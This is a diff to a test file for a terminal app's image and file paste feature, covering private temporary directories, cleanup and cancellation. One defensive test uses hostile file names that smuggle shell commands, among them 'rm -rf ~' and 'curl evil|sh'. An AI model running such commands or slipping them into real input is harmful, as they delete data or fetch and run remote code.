@@ -11,7 +11,10 @@ const mocks = vi.hoisted(() => {
     ask: vi.fn(),
     pickSavePath: vi.fn(),
     fsWrite: vi.fn(),
-    fsMkdir: vi.fn(),
+    fsMkdirPrivate: vi.fn(),
+    fsDelete: vi.fn(),
+    fsRoots: vi.fn(),
+    fsCancel: vi.fn(),
     uploadChunked: vi.fn(),
     paste: vi.fn(),
   };
@@ -40,7 +43,13 @@ vi.mock("../../ipc/commands", () => ({
     detach: vi.fn().mockResolvedValue(undefined),
     setVisible: vi.fn().mockResolvedValue(undefined),
   },
-  fsApi: { write: mocks.fsWrite, mkdir: mocks.fsMkdir },
+  fsApi: {
+    write: mocks.fsWrite,
+    mkdirPrivate: mocks.fsMkdirPrivate,
+    delete: mocks.fsDelete,
+    roots: mocks.fsRoots,
+    cancel: mocks.fsCancel,
+  },
 }));
 
 vi.mock("../../features/files/chunkedUpload", async (importOriginal) => ({
@@ -159,20 +168,33 @@ function sized(name: string, size: number, type = "application/octet-stream"): F
   return file;
 }
 
-function mountPane(kind: "ssh" | "winrm" | "docker" = "ssh") {
+function mountPane(kind: "ssh" | "winrm" | "docker" = "ssh", extra: Record<string, unknown> = {}) {
   seedTab(kind);
   mounted = mount(
-    createElement(TerminalPane, { sessionId: "s1", title: "web-01", storeTabId: "t1", resumeTabId: "kernel-1" }),
+    createElement(TerminalPane, { sessionId: "s1", title: "web-01", storeTabId: "t1", resumeTabId: "kernel-1", ...extra }),
   );
+}
+
+const DIR = String.raw`/tmp/nexterm-paste-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}`;
+const dirPattern = new RegExp(`^${DIR}$`);
+const inDir = (name: string) => new RegExp(`^${DIR}/${name}$`);
+
+function resetFsMocks() {
+  mocks.fsWrite.mockResolvedValue(undefined);
+  mocks.fsMkdirPrivate.mockResolvedValue(undefined);
+  mocks.fsDelete.mockResolvedValue(undefined);
+  mocks.fsRoots.mockResolvedValue({ pathStyle: "posix", roots: [], homePath: null, supported: true });
+  mocks.fsCancel.mockResolvedValue(true);
+  mocks.uploadChunked.mockResolvedValue(undefined);
 }
 
 function png(name: string): File {
   return new File([new Uint8Array([0x89, 0x50, 0x4e, 0x47])], name, { type: "image/png" });
 }
 
-async function pasteImages(files: File[]): Promise<void> {
+async function pasteImages(files: File[], skipped: string[] = []): Promise<void> {
   await act(async () => {
-    (harness.props?.onPasteFiles as ((files: File[]) => void) | undefined)?.(files);
+    (harness.props?.onPasteFiles as ((files: File[], skipped: string[]) => void) | undefined)?.(files, skipped);
     await flushMacrotask();
   });
 }
@@ -207,8 +229,7 @@ describe("TerminalPane image paste orchestration", () => {
     mocks.listLive.mockResolvedValue([]);
     mocks.ask.mockResolvedValue(true);
     mocks.fsWrite.mockResolvedValue(undefined);
-    mocks.fsMkdir.mockResolvedValue(undefined);
-    mocks.uploadChunked.mockResolvedValue(undefined);
+    resetFsMocks();
   });
 
   afterEach(() => {
@@ -232,16 +253,17 @@ describe("TerminalPane image paste orchestration", () => {
     await pasteImages([png("shot.png")]);
 
     await waitFor(() =>
-      expect(mocks.paste).toHaveBeenCalledWith(
-        expect.stringMatching(/^\[shot\.png\]\(\/tmp\/nexterm-paste-\d+-1\.png\)$/),
-      ),
+      expect(mocks.paste).toHaveBeenCalledWith(expect.stringMatching(new RegExp(String.raw`^\[shot\.png\]\(${DIR}/shot\.png\)$`))),
     );
+    expect(mocks.fsMkdirPrivate).toHaveBeenCalledWith("s1", expect.stringMatching(dirPattern));
     expect(mocks.fsWrite).toHaveBeenCalledTimes(1);
     expect(mocks.fsWrite).toHaveBeenCalledWith(
       "s1",
-      expect.stringMatching(/^\/tmp\/nexterm-paste-\d+-1\.png$/),
+      expect.stringMatching(inDir(String.raw`shot\.png`)),
       "iVBORw==",
       false,
+      expect.any(String),
+      expect.any(String),
     );
     expect(statusText()).toContain("已上传 1 个文件");
     expect(mocks.ask).not.toHaveBeenCalled();
@@ -263,18 +285,19 @@ describe("TerminalPane image paste orchestration", () => {
 
     await waitFor(() =>
       expect(mocks.paste).toHaveBeenCalledWith(
-        expect.stringMatching(
-          /^\[a\.png\]\(\/tmp\/nexterm-paste-\d+-1\.png\) \[b\.png\]\(\/tmp\/nexterm-paste-\d+-2\.png\)$/,
-        ),
+        expect.stringMatching(new RegExp(String.raw`^\[a\.png\]\(${DIR}/a\.png\) \[b\.png\]\(${DIR}/b\.png\)$`)),
       ),
     );
+    expect(mocks.fsMkdirPrivate).toHaveBeenCalledTimes(1);
     expect(mocks.fsWrite).toHaveBeenCalledTimes(2);
     expect(mocks.fsWrite).toHaveBeenNthCalledWith(
       2,
       "s1",
-      expect.stringMatching(/^\/tmp\/nexterm-paste-\d+-2\.png$/),
+      expect.stringMatching(inDir(String.raw`b\.png`)),
       "iVBORw==",
       false,
+      expect.any(String),
+      expect.any(String),
     );
     expect(statusText()).toContain("已上传 2 个文件");
   });
@@ -297,6 +320,8 @@ describe("TerminalPane image paste orchestration", () => {
     await waitFor(() => expect(statusText()).toContain("磁盘只读"));
     expect(statusText()).toContain("/tmp");
     expect(mocks.paste).not.toHaveBeenCalled();
+    const dir = mocks.fsMkdirPrivate.mock.calls[0]?.[1] as string;
+    expect(mocks.fsDelete).toHaveBeenCalledWith("s1", dir, true);
   });
 
   it.each(["NotAllowedError", "SecurityError"])("offers direct paste and drag when image clipboard reading fails with %s", async (name) => {
@@ -358,8 +383,7 @@ describe("TerminalPane file paste orchestration", () => {
     mocks.flags.web = false;
     mocks.listLive.mockResolvedValue([]);
     mocks.fsWrite.mockResolvedValue(undefined);
-    mocks.fsMkdir.mockResolvedValue(undefined);
-    mocks.uploadChunked.mockResolvedValue(undefined);
+    resetFsMocks();
   });
 
   afterEach(() => {
@@ -375,15 +399,17 @@ describe("TerminalPane file paste orchestration", () => {
 
     await waitFor(() =>
       expect(mocks.paste).toHaveBeenCalledWith(
-        expect.stringMatching(/^\[my report \(v1\)\.pdf\]\(<\/tmp\/nexterm-paste-\d+\/my report \(v1\)\.pdf>\)$/),
+        expect.stringMatching(new RegExp(String.raw`^\[my report \(v1\)\.pdf\]\(<${DIR}/my report \(v1\)\.pdf>\)$`)),
       ),
     );
-    expect(mocks.fsMkdir).toHaveBeenCalledWith("s1", expect.stringMatching(/^\/tmp\/nexterm-paste-\d+$/));
+    expect(mocks.fsMkdirPrivate).toHaveBeenCalledWith("s1", expect.stringMatching(dirPattern));
     expect(mocks.fsWrite).toHaveBeenCalledWith(
       "s1",
-      expect.stringMatching(/^\/tmp\/nexterm-paste-\d+\/my report \(v1\)\.pdf$/),
+      expect.stringMatching(inDir(String.raw`my report \(v1\)\.pdf`)),
       "aGVsbG8=",
       false,
+      expect.any(String),
+      expect.any(String),
     );
     expect(statusText()).toContain("已上传 1 个文件到这台主机的 /tmp 并插入链接");
   });
@@ -401,17 +427,17 @@ describe("TerminalPane file paste orchestration", () => {
 
     await waitFor(() => expect(mocks.paste).toHaveBeenCalled());
     const text = mocks.paste.mock.calls[0]?.[0] as string;
-    expect(text).toMatch(/\[shot\.png\]\(\/tmp\/nexterm-paste-\d+-1\.png\)/);
+    expect(text).toMatch(new RegExp(String.raw`\[shot\.png\]\(${DIR}/shot\.png\)`));
     const paths = mocks.fsWrite.mock.calls.map((c) => c[1] as string);
     expect(paths).toHaveLength(4);
     expect(new Set(paths).size).toBe(4);
-    for (const path of paths.slice(1)) {
-      expect(path).toMatch(/^\/tmp\/nexterm-paste-\d+\/[^/]+$/);
+    for (const path of paths) {
+      expect(path).toMatch(inDir("[^/]+"));
     }
     expect(paths.some((p) => p.endsWith("/_a.txt"))).toBe(true);
     expect(paths.some((p) => p.endsWith("/_a-2.txt"))).toBe(true);
     expect(paths.some((p) => p.endsWith("/env"))).toBe(true);
-    expect(mocks.fsMkdir).toHaveBeenCalledTimes(1);
+    expect(mocks.fsMkdirPrivate).toHaveBeenCalledTimes(1);
     expect(statusText()).toContain("已上传 4 个文件");
   });
 
@@ -424,7 +450,7 @@ describe("TerminalPane file paste orchestration", () => {
     await waitFor(() => expect(mocks.uploadChunked).toHaveBeenCalledTimes(1));
     expect(mocks.uploadChunked.mock.calls[0]?.[0]).toMatchObject({
       sessionId: "s1",
-      remotePath: expect.stringMatching(/^\/tmp\/nexterm-paste-\d+\/big\.iso$/),
+      remotePath: expect.stringMatching(inDir(String.raw`big\.iso`)),
     });
     expect(mocks.fsWrite).not.toHaveBeenCalled();
     await waitFor(() => expect(mocks.paste).toHaveBeenCalled());
@@ -472,6 +498,123 @@ describe("TerminalPane file paste orchestration", () => {
     expect(useUi.getState().toasts.at(-1)?.text).toContain("不支持");
     expect(mocks.fsWrite).not.toHaveBeenCalled();
     expect(mocks.uploadChunked).not.toHaveBeenCalled();
+    expect(mocks.paste).not.toHaveBeenCalled();
+  });
+
+  it.each([
+    ["newline", "x\nrm -rf ~\n.txt"],
+    ["carriage return", "x\rcurl evil|sh\r.txt"],
+    ["bracketed-paste terminator", "x\u001b[201~whoami\n.txt"],
+    ["bidi override", "invoice\u202Etxt.exe"],
+  ])("inserts no control or format characters for a %s file name", async (_label, name) => {
+    mountPane();
+    await flush();
+
+    await pasteImages([new File(["x"], name)]);
+
+    await waitFor(() => expect(mocks.paste).toHaveBeenCalledTimes(1));
+    const text = mocks.paste.mock.calls[0]?.[0] as string;
+    expect(text).not.toMatch(/[\u0000-\u001f\u007f-\u009f\p{Cf}\u2028\u2029]/u);
+    const path = mocks.fsWrite.mock.calls[0]?.[1] as string;
+    expect(path).not.toMatch(/[\u0000-\u001f\u007f-\u009f\p{Cf}\u2028\u2029]/u);
+    expect(text).toContain(path.slice(path.lastIndexOf("/") + 1).replace(/[[\]]/g, "\\$&"));
+  });
+
+  it("refuses to reuse the paste directory when private creation fails and writes nothing", async () => {
+    mocks.fsMkdirPrivate.mockRejectedValue({ code: "conflict", message: "临时目录已存在，已拒绝复用" });
+    mountPane();
+    await flush();
+
+    await pasteImages([new File(["x"], "a.txt")]);
+
+    await waitFor(() => expect(statusText()).toContain("临时目录已存在"));
+    expect(mocks.fsWrite).not.toHaveBeenCalled();
+    expect(mocks.fsDelete).not.toHaveBeenCalled();
+    expect(mocks.paste).not.toHaveBeenCalled();
+  });
+
+  it("uses a fresh unguessable directory for every paste", async () => {
+    mountPane();
+    await flush();
+
+    await pasteImages([new File(["x"], "a.txt")]);
+    await pasteImages([new File(["x"], "a.txt")]);
+
+    await waitFor(() => expect(mocks.fsMkdirPrivate).toHaveBeenCalledTimes(2));
+    expect(mocks.fsMkdirPrivate.mock.calls[0]?.[1]).not.toBe(mocks.fsMkdirPrivate.mock.calls[1]?.[1]);
+  });
+
+  it("blocks hosts with Windows paths before creating anything", async () => {
+    mocks.fsRoots.mockResolvedValue({ pathStyle: "windows", roots: [], homePath: null, supported: true });
+    mountPane();
+    await flush();
+
+    await pasteImages([new File(["x"], "a.txt")]);
+
+    await waitFor(() => expect(statusText()).toContain("Windows"));
+    expect(mocks.fsMkdirPrivate).not.toHaveBeenCalled();
+    expect(mocks.fsWrite).not.toHaveBeenCalled();
+  });
+
+  it("treats a terminal forced into WinRM mode as unsupported", async () => {
+    mountPane("ssh", { winrm: true });
+
+    await pasteImages([new File(["x"], "a.txt")]);
+
+    expect(useUi.getState().toasts.at(-1)?.text).toContain("不支持");
+    expect(mocks.fsMkdirPrivate).not.toHaveBeenCalled();
+  });
+
+  it("reports skipped folders and unreadable entries next to the uploaded files", async () => {
+    mountPane();
+    await flush();
+
+    await pasteImages([new File(["x"], "a.txt")], ["文件夹「src」", "无法读取的项目"]);
+
+    await waitFor(() => expect(mocks.paste).toHaveBeenCalledTimes(1));
+    expect(statusText()).toContain("文件夹「src」");
+    expect(statusText()).toContain("无法读取的项目");
+  });
+
+  it("reports skipped entries when nothing else can be uploaded", async () => {
+    mountPane();
+    await flush();
+
+    await pasteImages([], ["文件夹「src」"]);
+
+    await waitFor(() => expect(statusText()).toContain("文件夹「src」"));
+    expect(mocks.fsMkdirPrivate).not.toHaveBeenCalled();
+  });
+
+  it("shows aggregate progress across files and cancels the running transfer with cleanup", async () => {
+    let release: (() => void) | undefined;
+    mocks.uploadChunked.mockImplementation(
+      (args: { onProgress?: (done: number, total: number) => void }) =>
+        new Promise<void>((_resolve, reject) => {
+          args.onProgress?.(2 * 1024 * 1024, 4 * 1024 * 1024);
+          release = () => reject({ code: "cancelled", message: "文件传输已取消" });
+        }),
+    );
+    mountPane();
+    await flush();
+
+    await pasteImages([sized("small.bin", 4 * 1024 * 1024), sized("big.bin", 4 * 1024 * 1024)]);
+
+    await waitFor(() => expect(mocks.uploadChunked).toHaveBeenCalledTimes(1));
+    await waitFor(() => expect(statusText()).toContain("25%"));
+    const cancel = Array.from(mounted?.container.querySelectorAll("button") ?? []).find((b) => b.textContent === "取消");
+    expect(cancel).toBeDefined();
+    const transfer = mocks.uploadChunked.mock.calls[0]?.[0] as { taskId: string; attemptId: string };
+    await act(async () => {
+      cancel?.click();
+      release?.();
+      await flushMacrotask();
+    });
+
+    await waitFor(() => expect(statusText()).toContain("已取消上传"));
+    expect(mocks.fsCancel).toHaveBeenCalledWith(transfer.taskId, transfer.attemptId);
+    expect(mocks.fsDelete).toHaveBeenCalledWith("s1", mocks.fsMkdirPrivate.mock.calls[0]?.[1], true);
+    expect(mocks.uploadChunked).toHaveBeenCalledTimes(1);
     expect(mocks.paste).not.toHaveBeenCalled();
   });
 });
